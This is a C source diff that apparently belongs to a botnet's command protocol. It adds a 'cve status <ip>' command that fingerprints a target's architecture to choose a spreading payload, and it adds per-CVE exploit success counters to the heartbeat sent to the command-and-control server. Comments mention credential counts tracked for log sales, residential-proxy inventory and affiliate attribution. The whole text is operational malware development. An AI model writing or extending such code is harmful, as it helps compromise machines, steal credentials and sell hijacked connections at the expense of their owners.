@@ -12,6 +12,7 @@
 #include "persist.h"
 #include "mesh.h"
 #include "util.h"
+#include "arch_detect.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -3755,9 +3756,33 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 else
                     snprintf(rbuf, sizeof(rbuf), "cve: disable failed (unknown id '%s')", id);
                 protocol_send_response(bot, CMD_CVE, rbuf);
+            } else if (strncmp(args, "status ", 7) == 0) {
+                /* #160: architecture fingerprint lookup for one target.
+                 * Runs the same arch_detect() the module runner uses
+                 * (cached per IP) so operators can see what payload
+                 * class a spread target would receive. */
+                char *tip = args + 7;
+                while (*tip == ' ') tip++;
+                char rbuf[1024];
+                char ip[64] = {0};
+                if (sscanf(tip, "%63s", ip) != 1 || ip[0] == '\0') {
+                    snprintf(rbuf, sizeof(rbuf),
+                             "cve status: missing <ip>");
+                } else {
+                    char info[96] = {0};
+                    const char *arch = arch_detect(ip, 80, info, sizeof(info));
+                    char stats[512];
+                    cve_stats_render(stats, sizeof(stats));
+                    snprintf(rbuf, sizeof(rbuf),
+                             "cve status %s: arch=%s (%.60s)%s%s",
+                             ip, arch, info,
+                             stats[0] ? " stats=" : "",
+                             stats[0] ? stats : "");
+                }
+                protocol_send_response(bot, CMD_CVE, rbuf);
             } else {
                 protocol_send_response(bot, CMD_CVE,
-                    "cve: usage 'cve list' | 'cve enable <id>' | 'cve disable <id>'");
+                    "cve: usage 'cve list' | 'cve enable <id>' | 'cve disable <id>' | 'cve status <ip>'");
             }
         } else if (strncmp(cmd, CMD_ROTATE, strlen(CMD_ROTATE)) == 0) {
             /* SECURITY FIX (#93): manual C2 rotation — advance the
@@ -3875,7 +3900,16 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     char safe_tag[BOT_TAG_MAX * 2 + 8];
     json_escape(bot->bot_tag, safe_tag, sizeof(safe_tag));
 
-    char heartbeat[1536];
+    /* #160: per-CVE-module telemetry. Non-zero hit/miss/fail counters
+     * as comma-separated "CVE-xxxx:kind=N" triplets; empty string when
+     * no module has run yet (field still emitted, so the C2 parser is
+     * uniform across bot versions). */
+    char cve_stats[512];
+    cve_stats_render(cve_stats, sizeof(cve_stats));
+    /* CVE ids + counter kinds are compile-time constants — nothing to
+     * JSON-escape. */
+
+    char heartbeat[2048];
     /* SECURITY FIX (#89): report proxy status so the C2 can build a
      * residential-proxy inventory (on/off + bound port).
      * (#90): report cred_count so the C2 can track log-sale inventory.
@@ -3884,10 +3918,10 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
      * (#93): report the affiliate/operator tag so the C2 can attribute
      * bots to affiliates (per-affiliate inventory + teardown). */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\"}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\",\"cve_stats\":\"%s\"}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
         spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port(),
-        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag);
+        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag, cve_stats);
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
